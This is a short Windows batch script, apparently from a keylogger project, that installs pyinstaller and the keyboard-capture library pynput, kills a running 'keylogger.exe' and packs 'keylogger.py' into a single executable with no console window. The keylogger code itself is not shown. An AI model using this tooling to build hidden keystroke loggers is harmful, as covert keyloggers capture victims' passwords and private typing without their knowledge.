@echo off
pip install pyinstaller
pip install pynput
SETLOCAL
TASKKILL /F /IM "keylogger.exe"
pyinstaller.exe --noconsole --onefile keylogger.py
IF %ERRORLEVEL% NEQ 0 (
echo FAILED TO PRODUCE EXE FILE.&echo
pause
)
